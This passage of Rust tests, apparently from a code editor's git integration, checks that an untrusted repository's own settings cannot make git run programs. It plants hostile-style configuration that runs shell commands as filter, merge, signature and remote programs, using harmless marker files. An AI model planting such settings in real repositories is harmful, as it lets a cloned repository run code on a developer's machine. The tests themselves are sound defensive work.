        }

        let head = git_command_output(&repo_dir, ["rev-parse", "HEAD"]);
        repository
            .blame_at_revision(
                RepoPath::new("f").unwrap(),
                Oid::from_str(head.trim()).unwrap(),
            )
            .await
            .unwrap();
        assert!(
            !marker.exists(),
            "blame ran the repository's textconv filter"
        );
    }

    /// An untrusted repository's own configuration names programs for `.gitattributes` to run on
    /// file contents (`filter.<driver>.clean`, `smudge`, `process`), and marks the driver
    /// `required` so that one which does not run fails the command. None of them may start, and
    /// the commands still succeed.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_filter_programs(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        fs::write(repo_dir.join("f.txt"), "one\n").unwrap();
        git_command(&repo_dir, ["add", "f.txt"]);
        git_command(&repo_dir, ["commit", "-m", "first"]);

        let marker = temp_dir.path().join("program-ran");
        let record_run = |what: &str| {
            format!(
                "sh -c 'echo {what} >> \"{}\"; cat'",
                marker.to_string_lossy().replace('\\', "/")
            )
        };
        for (name, variable) in [
            ("evil", "clean"),
            ("evil", "smudge"),
            ("evil.dotted", "clean"),
            ("proc", "process"),
        ] {
            git_command(
                &repo_dir,
                [
                    "config",
                    &format!("filter.{name}.{variable}"),
                    record_run(variable).as_str(),
                ],
            );
        }
        git_command(&repo_dir, ["config", "filter.evil.required", "true"]);
        fs::write(
            repo_dir.join(".git/info/attributes"),
            "*.txt filter=evil\n*.md filter=evil.dotted\n*.bin filter=proc\n",
        )
        .unwrap();
        fs::write(repo_dir.join("f.txt"), "two\n").unwrap();
        fs::write(repo_dir.join("g.md"), "md\n").unwrap();
        fs::write(repo_dir.join("h.bin"), "bin\n").unwrap();
        for args in [
            vec!["hash-object", "--path", "f.txt", "f.txt"],
            vec!["hash-object", "--path", "g.md", "g.md"],
        ] {
            git_command_output(&repo_dir, &args);
            assert!(
                marker.exists(),
                "the installed git runs the repository's filter for {args:?}"
            );
            fs::remove_file(&marker).unwrap();
        }

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for args in [
            // Same size as what was committed, so git reads the file to tell.
            vec!["ls-files", "-m"],
            vec!["describe", "--dirty", "--always"],
            vec!["hash-object", "--path", "f.txt", "f.txt"],
            vec!["hash-object", "--path", "g.md", "g.md"],
            vec!["hash-object", "--path", "h.bin", "h.bin"],
            vec!["status", "--porcelain"],
            vec!["add", "f.txt", "g.md", "h.bin"],
            vec!["checkout", "HEAD", "--", "f.txt"],
        ] {
            let output = git.build_command(&args).await.output().await.unwrap();
            assert!(
                output.status.success(),
                "{args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert!(
                !marker.exists(),
                "{args:?} ran the repository's filter program"
            );
        }
        assert_eq!(fs::read_to_string(repo_dir.join("f.txt")).unwrap(), "one\n");
    }

    /// A submodule's own configuration can name a filter too, which the drivers disabled for the
    /// superproject do not cover; `status` and `diff` look inside a submodule by running git
    /// there, so they must not.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_submodule_filter_programs(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let submodule_dir = repo_dir.join("sub");
        git_init_repo(&repo_dir);
        git_init_repo(&submodule_dir);
        fs::write(submodule_dir.join("f.txt"), "one\n").unwrap();
        git_command(&submodule_dir, ["add", "f.txt"]);
        git_command(&submodule_dir, ["commit", "-m", "inner"]);
        git_command(&repo_dir, ["add", "sub"]);
        git_command(&repo_dir, ["commit", "-m", "outer"]);

        let marker = temp_dir.path().join("program-ran");
        git_command(
            &submodule_dir,
            [
                "config",
                "filter.evil.clean",
                &format!(
                    "sh -c 'echo clean >> \"{}\"; cat'",
                    marker.to_string_lossy().replace('\\', "/")
                ),
            ],
        );
        git_command(&repo_dir, ["config", "submodule.sub.ignore", "none"]);
        fs::write(
            submodule_dir.join(".git/info/attributes"),
            "*.txt filter=evil\n",
        )
        .unwrap();
        // Same size, so the submodule's git reads the file to tell whether it changed.
        fs::write(submodule_dir.join("f.txt"), "two\n").unwrap();
        git_command_output(&repo_dir, &["status", "--porcelain"]);
        assert!(
            marker.exists(),
            "the installed git runs the submodule's filter for the superproject's status"
        );
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for args in [vec!["status", "--porcelain"], vec!["diff", "--stat"]] {
            let output = git.build_command(&args).await.output().await.unwrap();
            assert!(
                output.status.success(),
                "{args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert!(
                !marker.exists(),
                "{args:?} ran the submodule's filter program"
            );
        }
    }

    /// When the filter drivers cannot be listed in a form `-c` can disable, the command is not
    /// run at all, and git's error says why.
    #[gpui::test]
    async fn test_untrusted_repository_refuses_filters_it_cannot_disable(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let marker = temp_dir.path().join("program-ran");
        git_command(
            &repo_dir,
            [
                "config",
                "filter.x=y.clean",
                &format!(
                    "sh -c 'echo clean >> \"{}\"; cat'",
                    marker.to_string_lossy().replace('\\', "/")
                ),
            ],
        );
        fs::write(repo_dir.join(".git/info/attributes"), "*.txt filter=x=y\n").unwrap();
        fs::write(repo_dir.join("f.txt"), "one\n").unwrap();
        git_command_output(&repo_dir, &["hash-object", "--path", "f.txt", "f.txt"]);
        assert!(marker.exists(), "the installed git runs a driver named so");
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["hash-object", "--path", "f.txt", "f.txt"])
            .await
            .output()
            .await
            .unwrap();
        assert!(!output.status.success());
        assert!(!marker.exists());
        assert!(
            String::from_utf8_lossy(&output.stderr).contains(UNTRUSTED_FILTERS_NOT_DISABLED),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    /// A program for `gpg.program` that records each run in `marker` and fails, as a signature
    /// program that could not verify anything would.
    fn write_recording_signature_program(directory: &Path, name: &str, marker: &Path) -> String {
        let program = directory.join(name);
        fs::write(
            &program,
            format!(
                "#!/bin/sh\necho ran >> \"{}\"\nexit 1\n",
                marker.to_string_lossy().replace('\\', "/")
            ),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            fs::set_permissions(&program, fs::Permissions::from_mode(0o755)).unwrap();
        }
        program.to_string_lossy().replace('\\', "/")
    }

    /// Moves `HEAD` of the repository at `repo_dir` onto a new commit whose `gpgsig` header asks
    /// for the signature to be checked.
    fn commit_with_signature_header(repo_dir: &Path) {
        let tree = git_command_output(repo_dir, ["rev-parse", "HEAD^{tree}"]);
        let parent = git_command_output(repo_dir, ["rev-parse", "HEAD"]);
        let commit_file = repo_dir.join(".git/signed-commit");
        fs::write(
            &commit_file,
            format!(
                "tree {tree}\nparent {parent}\n\
                 author a <a@b> 1700000000 +0000\ncommitter a <a@b> 1700000000 +0000\n\
                 gpgsig -----BEGIN PGP SIGNATURE-----\n \n iQEzBAABCAAdFiEE\n -----END PGP SIGNATURE-----\n\
                 \nsigned\n"
            ),
        )
        .unwrap();
        let commit = git_command_output(
            repo_dir,
            [
                OsString::from("hash-object"),
                OsString::from("-t"),
                OsString::from("commit"),
                OsString::from("-w"),
                commit_file.into_os_string(),
            ],
        );
        git_command(repo_dir, ["update-ref", "HEAD", &commit]);
    }

    /// The repository's own configuration can name the program git runs to check a signature,
    /// and ask for the check on every `log`. Neither the graph's `log` nor a `log` or ref listing
    /// that asks for signatures may run it in an untrusted repository.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_signature_programs(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        git_command(&repo_dir, ["commit", "--allow-empty", "-m", "first"]);
        commit_with_signature_header(&repo_dir);
        let marker = temp_dir.path().join("program-ran");
        let program = write_recording_signature_program(temp_dir.path(), "evil-gpg", &marker);
        git_command(&repo_dir, ["config", "log.showSignature", "true"]);
        git_command(&repo_dir, ["config", "gpg.program", &program]);
        git_command(&repo_dir, ["config", "pretty.sig", "%G?"]);
        git_command_output(&repo_dir, ["log", "-1", "--format=%s"]);
        assert!(
            marker.exists(),
            "the installed git runs the repository's signature program for a log"
        );
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for (args, must_succeed) in [
            (
                vec!["log", GRAPH_COMMIT_FORMAT, "--date-order", "HEAD"],
                true,
            ),
            (vec!["log", "-1"], true),
            (vec!["show", "--no-patch", "HEAD"], true),
            (vec!["log", "-1", "--format=%G?"], false),
            (vec!["log", "-1", "--pretty=sig"], false),
            (vec!["show", "--show-signature", "HEAD"], false),
            (vec!["rev-list", "-1", "--format=%G?", "HEAD"], false),
            (vec!["for-each-ref", "--format=%(signature)"], false),
            (vec!["verify-commit", "HEAD"], false),
        ] {
            let output = git.build_command(&args).await.output().await.unwrap();
            if must_succeed {
                assert!(
                    output.status.success(),
                    "{args:?}: {}",
                    String::from_utf8_lossy(&output.stderr)
                );
            }
            assert!(
                !marker.exists(),
                "{args:?} ran the repository's signature program"
            );
        }
    }

    /// The user's own signature program keeps working in an untrusted repository whose
    /// configuration names another one.
    #[gpui::test]
    async fn test_untrusted_repository_keeps_the_users_signature_program(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        git_command(&repo_dir, ["commit", "--allow-empty", "-m", "first"]);
        commit_with_signature_header(&repo_dir);
        let repository_marker = temp_dir.path().join("repository-program-ran");
        let users_marker = temp_dir.path().join("users-program-ran");
        let repository_program =
            write_recording_signature_program(temp_dir.path(), "evil-gpg", &repository_marker);
        let users_program =
            write_recording_signature_program(temp_dir.path(), "my-gpg", &users_marker);
        git_command(&repo_dir, ["config", "gpg.program", &repository_program]);
        let global_config = temp_dir.path().join("global-config");
        fs::write(
            &global_config,
            format!("[gpg]\n\tprogram = \"{users_program}\"\n"),
        )
        .unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        )
        .envs(HashMap::from_iter([(
            "GIT_CONFIG_GLOBAL".to_string(),
            global_config.to_string_lossy().into_owned(),
        )]));
        let output = git
            .build_command(&["log", "-1", "--format=%G?"])
            .await
            .output()
            .await
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(!repository_marker.exists());
        assert!(
            users_marker.exists(),
            "the user's global gpg.program should check the signature"
        );
    }

    /// A commit the repository's configuration asks to sign with its own program is made
    /// unsigned in an untrusted repository, and says so.
    #[gpui::test]
    async fn test_untrusted_repository_commits_without_its_signature_program(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        git_command(&repo_dir, ["commit", "--allow-empty", "-m", "first"]);
        let marker = temp_dir.path().join("program-ran");
        let program = write_recording_signature_program(temp_dir.path(), "evil-gpg", &marker);
        git_command(&repo_dir, ["config", "gpg.program", &program]);
        git_command(&repo_dir, ["config", "commit.gpgSign", "true"]);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);
        let result = repo
            .commit(
                "unsigned".into(),
                None,
                CommitOptions {
                    allow_empty: true,
                    ..CommitOptions::default()
                },
                AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
                Arc::new(test_commit_envs()),
            )
            .await;
        let error = result.expect_err("signing was skipped, which the caller must hear about");
        assert!(is_committed_without_signature(&error), "{error:#}");
        assert!(is_committed_without_signature(&anyhow!("{error:#}")));
        assert!(!marker.exists(), "the commit ran the repository's program");
        assert_eq!(
            git_command_output(&repo_dir, ["log", "-1", "--format=%s"]),
            "unsigned"
        );
    }

    fn test_identity() -> Arc<GitIdentity> {
        Arc::new(
            GitIdentity::new(
                "Ada Work",
                "ada@work.example",
                Some("ABCD1234"),
                Some(crate::account::GitHttpsLogin::new("github.com", "ada-work").unwrap()),
            )
            .unwrap(),
        )
    }

    /// ADR-F93: a commit made while an account is picked is authored and committed as that
    /// account, over the repository's own `user.name` / `user.email`.
    #[gpui::test]
    async fn test_commit_uses_the_picked_account(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        git_command(&repo_dir, ["config", "user.name", "Repository User"]);
        git_command(&repo_dir, ["config", "user.email", "repo@example.com"]);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);
        let environment = Arc::new(HashMap::from_iter([(
            "GIT_ASKPASS".to_string(),
            "false".to_string(),
        )]));
        let commit = |message: &'static str| {
            repo.commit(
                message.into(),
                None,
                CommitOptions {
                    allow_empty: true,
                    ..CommitOptions::default()
                },
                AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
                environment.clone(),
            )
        };

        commit("as the repository's user").await.unwrap();
        assert_eq!(
            git_command_output(&repo_dir, ["log", "-1", "--format=%an <%ae>|%cn <%ce>"]),
            "Repository User <repo@example.com>|Repository User <repo@example.com>"
        );

        repo.set_identity(Some(test_identity()));
        commit("as the account").await.unwrap();
        assert_eq!(
            git_command_output(&repo_dir, ["log", "-1", "--format=%an <%ae>|%cn <%ce>"]),
            "Ada Work <ada@work.example>|Ada Work <ada@work.example>"
        );

        repo.set_identity(None);
        commit("back to git's configuration").await.unwrap();
        assert_eq!(
            git_command_output(&repo_dir, ["log", "-1", "--format=%an <%ae>"]),
            "Repository User <repo@example.com>"
        );
    }

    /// ADR-F93: with an account that has an HTTPS login, git's credential helpers are emptied for
    /// that host only (so askpass, which answers with the token, is asked), and the login and
    /// signing key are configured; the command line carries no secret.
    #[gpui::test]
    async fn test_identity_configures_git_for_its_host_only(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        git_command(&repo_dir, ["config", "credential.helper", "store"]);
        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        repo.set_trusted(true);

        let helper_for = |url: &'static str| {
            let git = repo.git_binary();
            async move {
                git.run(&["config", "--get-urlmatch", "credential.helper", url])
                    .await
                    .unwrap()
            }
        };
        assert_eq!(helper_for("https://github.com/owner/repo").await, "store");

        repo.set_identity(Some(test_identity()));
        assert_eq!(helper_for("https://github.com/owner/repo").await, "");
        assert_eq!(helper_for("https://gitlab.com/owner/repo").await, "store");
        let git = repo.git_binary();
        assert_eq!(
            git.run(&[
                "config",
                "--get-urlmatch",
                "credential.username",
                "https://github.com/owner/repo"
            ])
            .await
            .unwrap(),
            "ada-work"
        );
        assert_eq!(
            git.run(&["config", "user.signingkey"]).await.unwrap(),
            "ABCD1234"
        );
        assert!(
            git.run(&["var", "GIT_COMMITTER_IDENT"])
                .await
                .unwrap()
                .starts_with("Ada Work <ada@work.example> ")
        );
    }

    /// A remote server writes the sentence in the display language the client sent it, with the
    /// same bundled catalog: the text alone is recognized whichever language the client shows.
    #[test]
    fn test_committed_without_signature_is_recognized_in_the_servers_language() {
        let japanese_sentence = {
            let _japanese = i18n::test_support::LocaleOverride::new(Some(
                i18n_catalog::test_support::bundled_catalog("ja"),
            ));
            let sentence = CommittedWithoutSignature.to_string();
            assert!(
                is_committed_without_signature(&anyhow!("{sentence}")),
                "{sentence}"
            );
            sentence
        };
        let english_sentence = CommittedWithoutSignature.to_string();
        assert_ne!(japanese_sentence, english_sentence);
        for sentence in [&japanese_sentence, &english_sentence] {
            assert!(
                is_committed_without_signature(&anyhow!("{sentence}")),
                "{sentence}"
            );
        }
        assert!(!is_committed_without_signature(&anyhow!(
            "the commit failed"
        )));
    }

    /// Git running inside a submodule, which `add -A` and `describe --dirty` start in order to
    /// tell whether the submodule changed, gets the superproject's `-c` options: they must also
    /// disable the filter drivers of every submodule, however deep.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_filter_programs_inside_submodules(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let submodule_dir = repo_dir.join("sub");
        let nested_dir = submodule_dir.join("nested");
        git_init_repo(&repo_dir);
        git_init_repo(&submodule_dir);
        git_init_repo(&nested_dir);
        for directory in [&nested_dir, &submodule_dir] {
            fs::write(directory.join("f.txt"), "one\n").unwrap();
        }
        git_command(&nested_dir, ["add", "f.txt"]);
        git_command(&nested_dir, ["commit", "-m", "nested"]);
        git_command(&submodule_dir, ["add", "f.txt", "nested"]);
        git_command(&submodule_dir, ["commit", "-m", "inner"]);
        fs::write(repo_dir.join("top.txt"), "one\n").unwrap();
        git_command(&repo_dir, ["add", "top.txt", "sub"]);
        git_command(&repo_dir, ["commit", "-m", "outer"]);

        let marker = temp_dir.path().join("program-ran");
        for (directory, driver) in [(&submodule_dir, "evil"), (&nested_dir, "deep")] {
            git_command(
                directory,
                [
                    "config",
                    &format!("filter.{driver}.clean"),
                    &format!(
                        "sh -c 'echo {driver} >> \"{}\"; cat'",
                        marker.to_string_lossy().replace('\\', "/")
                    ),
                ],
            );
            git_command(
                directory,
                ["config", &format!("filter.{driver}.required"), "true"],
            );
            fs::write(
                directory.join(".git/info/attributes"),
                format!("*.txt filter={driver}\n"),
            )
            .unwrap();
            // Same size, so git inside reads the file to tell whether it changed.
            fs::write(directory.join("f.txt"), "two\n").unwrap();
        }
        let add_all = vec!["add", "-A"];
        let describe_dirty = vec!["describe", "--dirty", "--always"];
        git_command_output(&repo_dir, &describe_dirty);
        let ran = fs::read_to_string(&marker).unwrap();
        assert!(
            ran.contains("evil") && ran.contains("deep"),
            "the installed git runs the filters of nested submodules: {ran:?}"
        );
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for args in [describe_dirty, add_all] {
            let output = git.build_command(&args).await.output().await.unwrap();
            assert!(
                output.status.success(),
                "{args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert!(
                !marker.exists(),
                "{args:?} ran a submodule's filter program: {:?}",
                fs::read_to_string(&marker)
            );
        }
    }

    /// A checked-out submodule whose configuration cannot be read might name any filter, so the
    /// command is not run.
    #[gpui::test]
    async fn test_untrusted_repository_refuses_submodules_it_cannot_read(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let submodule_dir = repo_dir.join("sub");
        git_init_repo(&repo_dir);
        git_init_repo(&submodule_dir);
        git_command(&submodule_dir, ["commit", "--allow-empty", "-m", "inner"]);
        git_command(&repo_dir, ["add", "sub"]);
        git_command(&repo_dir, ["commit", "-m", "outer"]);
        fs::remove_dir_all(submodule_dir.join(".git")).unwrap();
        fs::write(submodule_dir.join(".git"), "gitdir: ../missing\n").unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["add", "-A"])
            .await
            .output()
            .await
            .unwrap();
        assert!(!output.status.success());
        assert!(
            String::from_utf8_lossy(&output.stderr).contains(UNTRUSTED_FILTERS_NOT_DISABLED),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );

        let output = git
            .build_command(&["status", "--porcelain"])
            .await
            .output()
            .await
            .unwrap();
        assert!(
            !String::from_utf8_lossy(&output.stderr).contains(UNTRUSTED_FILTERS_NOT_DISABLED),
            "status does not look inside submodules, so it needs no submodule's configuration"
        );
    }

    /// The refusal holds whatever the catalog translates it into, and says why in the display
    /// language when the translation can be quoted.
    #[gpui::test]
    async fn test_untrusted_refusal_holds_with_any_translation(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let marker = temp_dir.path().join("program-ran");
        git_command(
            &repo_dir,
            [
                "config",
                "filter.x=y.clean",
                &format!(
                    "sh -c 'echo clean >> \"{}\"; cat'",
                    marker.to_string_lossy().replace('\\', "/")
                ),
            ],
        );
        fs::write(repo_dir.join(".git/info/attributes"), "*.txt filter=x=y\n").unwrap();
        fs::write(repo_dir.join("f.txt"), "one\n").unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        let japanese = {
            let _japanese = i18n::test_support::LocaleOverride::new(Some(
                i18n_catalog::test_support::bundled_catalog("ja"),
            ));
            i18n::tr(UNTRUSTED_FILTERS_NOT_DISABLED)
        };
        // Each catalog, with the key git's error quotes: the translation when it is passed on.
        let mut catalogs: Vec<(String, &'static dyn i18n::Catalog, String)> = vec![(
            japanese.to_string(),
            i18n_catalog::test_support::bundled_catalog("ja"),
            japanese.to_string(),
        )];
        for (translation, passed_on) in hostile_translations() {
            let quoted = if passed_on && !translation.contains('\n') {
                translation.trim().to_string()
            } else if passed_on {
                "line one".to_string()
            } else {
                UNTRUSTED_FILTERS_NOT_DISABLED.to_string()
            };
            catalogs.push((
                translation.clone(),
                catalog_translating_everything_into(&translation),
                quoted,
            ));
        }
        let mut unexplained = Vec::new();
        for (translation, catalog, quoted) in catalogs {
            let _locale = i18n::test_support::LocaleOverride::new(Some(catalog));
            let output = git
                .build_command(&["hash-object", "--path", "f.txt", "f.txt"])
                .await
                .output()
                .await;
            assert!(!marker.exists(), "{translation:?} let the filter run");
            match output {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    assert!(!output.status.success(), "{translation:?}: {stderr}");
                    if !stderr.contains(&quoted) {
                        unexplained.push(format!("{translation:?}: {stderr}"));
                    }
                }
                Err(error) => unexplained.push(format!("{translation:?}: {error}")),
            }
        }
        assert!(unexplained.is_empty(), "{unexplained:#?}");
    }

    fn forward_slashes(path: &Path) -> String {
        path.to_string_lossy().replace('\\', "/")
    }

    /// A program that notes it ran in `marker` and fails, for settings git runs directly rather
    /// than through a shell.
    fn write_marker_program(path: &Path, marker: &Path) {
        fs::write(
            path,
            format!(
                "#!/bin/sh\necho ran >> \"{}\"\nexit 1\n",
                forward_slashes(marker)
            ),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
        }
    }

    /// `git` run directly, without the guards, for what they stand in the way of.
    #[allow(clippy::disallowed_methods)]
    fn unguarded_git_output(
        working_directory: &Path,
        arguments: &[&str],
        stdin: &str,
    ) -> std::process::Output {
        use std::io::Write as _;
        let mut child = std::process::Command::new("git")
            .args(arguments)
            .current_dir(working_directory)
            .env("GIT_CONFIG_GLOBAL", "")
            .env("GIT_CONFIG_SYSTEM", "")
            .env("GIT_TERMINAL_PROMPT", "0")
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        child
            .stdin
            .take()
            .unwrap()
            .write_all(stdin.as_bytes())
            .unwrap();
        child.wait_with_output().unwrap()
    }

    /// `.gitattributes` can pick a merge driver whose program the repository's configuration
    /// names, for `merge`, `cherry-pick`, `rebase`, `revert` and `stash apply`. It is replaced by
    /// one that always fails, which leaves the file conflicted for the user to resolve.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_merge_drivers(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        // `merge` wants an identity before it merges anything.
        git_command(&repo_dir, ["config", "user.name", "test"]);
        git_command(&repo_dir, ["config", "user.email", "test@zed.dev"]);
        fs::write(repo_dir.join(".gitattributes"), "*.txt merge=evil\n").unwrap();
        fs::write(repo_dir.join("f.txt"), "base\n").unwrap();
        git_command(&repo_dir, ["add", "."]);
        git_command(&repo_dir, ["commit", "-m", "base"]);
        git_command(&repo_dir, ["checkout", "-b", "other"]);
        fs::write(repo_dir.join("f.txt"), "theirs\n").unwrap();
        git_command(&repo_dir, ["commit", "-am", "theirs"]);
        git_command(&repo_dir, ["checkout", "main"]);
        fs::write(repo_dir.join("f.txt"), "ours\n").unwrap();
        git_command(&repo_dir, ["commit", "-am", "ours"]);
        let marker = temp_dir.path().join("program-ran");
        git_command(
            &repo_dir,
            [
                "config",
                "merge.evil.driver",
                &format!("echo merge >> \"{}\"", forward_slashes(&marker)),
            ],
        );

        git_command(&repo_dir, ["merge", "--no-commit", "--no-ff", "other"]);
        assert!(marker.exists(), "the installed git runs the merge driver");
        git_command(&repo_dir, ["merge", "--abort"]);
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["merge", "other"])
            .await
            .output()
            .await
            .unwrap();
        assert!(
            !marker.exists(),
            "the repository's merge driver ran: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            !output.status.success(),
            "the merge must not look clean: {}",
            String::from_utf8_lossy(&output.stdout)
        );
        assert!(
            String::from_utf8_lossy(&output.stdout).contains("CONFLICT"),
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        assert_eq!(
            git_command_output(&repo_dir, ["status", "--porcelain"]),
            "UU f.txt"
        );
    }

    /// For a local path or `file://` URL, `fetch`, `ls-remote` and `pull` run the program
    /// `remote.<name>.uploadpack` names, and `push` the one `receivepack` names. Git takes the
    /// first of several values, so `-c` cannot replace the repository's; the command is refused.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_remote_programs(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let source_dir = temp_dir.path().join("source");
        let destination_dir = temp_dir.path().join("destination.git");
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&source_dir);
        git_command(&source_dir, ["commit", "--allow-empty", "-m", "source"]);
        git_command(
            temp_dir.path(),
            [
                OsString::from("init"),
                OsString::from("--bare"),
                destination_dir.as_os_str().into(),
            ],
        );
        git_init_repo(&repo_dir);
        git_command(&repo_dir, ["commit", "--allow-empty", "-m", "repo"]);
        git_command(
            &repo_dir,
            [
                OsString::from("remote"),
                OsString::from("add"),
                OsString::from("source"),
                source_dir.as_os_str().into(),
            ],
        );
        git_command(
            &repo_dir,
            [
                OsString::from("remote"),
                OsString::from("add"),
                OsString::from("destination"),
                destination_dir.as_os_str().into(),
            ],
        );
        let marker = temp_dir.path().join("program-ran");
        let marker_path = forward_slashes(&marker);
        git_command(
            &repo_dir,
            [
                "config",
                "remote.source.uploadpack",
                &format!("echo uploadpack >> \"{marker_path}\"; git-upload-pack"),
            ],
        );
        git_command(
            &repo_dir,
            [
                "config",
                "remote.destination.receivepack",
                &format!("echo receivepack >> \"{marker_path}\"; git-receive-pack"),
            ],
        );

        git_command(&repo_dir, ["fetch", "source"]);
        git_command(&repo_dir, ["push", "destination", "main"]);
        let ran = fs::read_to_string(&marker).unwrap();
        assert!(
            ran.contains("uploadpack") && ran.contains("receivepack"),
            "the installed git runs both programs: {ran:?}"
        );
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for args in [
            vec!["fetch", "source"],
            vec!["ls-remote", "source"],
            vec!["pull", "source", "main"],
            vec!["push", "destination", "main:other"],
        ] {
            let output = git.build_command(&args).await.output().await.unwrap();
            assert!(
                !marker.exists(),
                "{args:?} ran {:?}",
                fs::read_to_string(&marker)
            );
            assert!(!output.status.success(), "{args:?}");
            assert!(
                String::from_utf8_lossy(&output.stderr).contains(UNTRUSTED_REMOTE_PROGRAMS_REFUSED),
                "{args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }

        git_command(&repo_dir, ["config", "--unset", "remote.source.uploadpack"]);
        git_command(
            &repo_dir,
            ["config", "--unset", "remote.destination.receivepack"],
        );
        for args in [
            vec!["fetch", "source"],
            vec!["push", "destination", "main:other"],
        ] {
            let output = git.build_command(&args).await.output().await.unwrap();
            assert!(
                output.status.success(),
                "{args:?} without the repository's programs: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

